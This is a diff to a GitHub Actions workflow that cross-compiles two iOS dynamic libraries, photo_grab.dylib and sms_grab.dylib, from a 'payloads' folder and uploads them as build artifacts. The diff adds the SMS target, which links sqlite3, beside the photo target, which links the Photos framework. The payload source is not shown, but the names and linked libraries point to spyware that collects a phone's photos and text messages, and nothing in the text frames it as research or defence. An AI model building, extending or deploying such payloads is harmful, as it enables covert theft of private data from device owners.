@@ -1,44 +1,49 @@
-name: Build photo_grab.dylib
+name: Build Grab Dylibs
 
 on:
   push:
     paths:
       - 'payloads/photo_grab.c'
-      - 'payloads/photo_grab.m'
+      - 'payloads/sms_grab.c'
+      - '.github/workflows/build.yml'
   workflow_dispatch:
 
 jobs:
   build:
     runs-on: macos-latest
     steps:
-      - name: Checkout code
+      - name: Checkout
         uses: actions/checkout@v4
-
-      - name: Show Xcode version
-        run: xcodebuild -version
 
       - name: Compile photo_grab.dylib
         run: |
-          SDK_PATH=$(xcrun --sdk iphoneos --show-sdk-path)
-          echo "Using SDK: $SDK_PATH"
-          # 重命名为 .m 强制按 Objective-C 编译
+          SDK=$(xcrun --sdk iphoneos --show-sdk-path)
           cp payloads/photo_grab.c payloads/photo_grab.m
-          xcrun --sdk iphoneos clang \
-            -arch arm64 -dynamiclib \
-            -fobjc-arc \
-            -mios-version-min=14.0 \
-            -Wno-deprecated-declarations \
-            -Wno-unguarded-availability-new \
-            -Wno-error \
+          xcrun --sdk iphoneos clang -arch arm64 -dynamiclib \
+            -fobjc-arc -mios-version-min=14.0 \
+            -Wno-deprecated-declarations -Wno-error \
             -framework Foundation -framework Photos -framework UIKit \
-            -o payloads/photo_grab.dylib \
-            payloads/photo_grab.m
+            -o payloads/photo_grab.dylib payloads/photo_grab.m
           file payloads/photo_grab.dylib
           ls -lh payloads/photo_grab.dylib
 
-      - name: Upload dylib artifact
+      - name: Compile sms_grab.dylib
+        run: |
+          SDK=$(xcrun --sdk iphoneos --show-sdk-path)
+          cp payloads/sms_grab.c payloads/sms_grab.m
+          xcrun --sdk iphoneos clang -arch arm64 -dynamiclib \
+            -fobjc-arc -mios-version-min=14.0 \
+            -Wno-deprecated-declarations -Wno-error \
+            -framework Foundation -lsqlite3 \
+            -o payloads/sms_grab.dylib payloads/sms_grab.m
+          file payloads/sms_grab.dylib
+          ls -lh payloads/sms_grab.dylib
+
+      - name: Upload artifacts
         uses: actions/upload-artifact@v4
         with:
-          name: photo_grab.dylib
-          path: payloads/photo_grab.dylib
+          name: grab-dylibs
+          path: |
+            payloads/photo_grab.dylib
+            payloads/sms_grab.dylib
           retention-days: 90
